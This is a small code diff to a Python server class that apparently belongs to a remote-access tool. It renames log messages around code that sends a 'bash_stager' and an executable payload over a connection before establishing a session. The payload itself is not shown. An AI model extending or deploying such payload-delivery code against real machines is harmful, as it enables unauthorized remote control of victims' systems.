@@ -160,12 +160,12 @@ class Server:
         except Exception as e:
             raw_input("Press enter to continue...")
             return
-        self.verbose_print("Sending Mouse Payload...")
+        self.verbose_print("Sending Payload...")
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
 
         # send executable
-        self.debug_print("Sending Mouse Executable...")
+        self.debug_print("Sending Executable...")
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
